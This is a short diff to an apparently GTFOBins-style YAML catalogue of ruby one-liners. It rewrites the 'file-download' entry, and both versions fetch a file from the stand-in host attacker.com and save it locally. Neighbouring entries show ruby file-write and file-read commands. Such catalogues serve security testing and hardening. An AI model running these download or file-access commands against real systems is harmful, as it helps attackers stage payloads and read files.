@@ -16,11 +16,9 @@ functions:
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
-        export RHOST=attacker.com
-        export RPORT=12345
-        export RFILE=/file_to_get
+        export URL=http://attacker.com/file_to_get
         export LFILE=file_to_save
-        ruby -e 'require "net/http"; Net::HTTP.start(ENV["RHOST"], ENV["RPORT"]) { |http| r = http.get(ENV["RFILE"]); open(ENV["LFILE"], "wb") { |file| file.write(r.body) } }'
+        ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
   file-write:
     - code: ruby -e 'File.open("file_to_write", "w+") { |f| f.write("DATA") }'
   file-read:
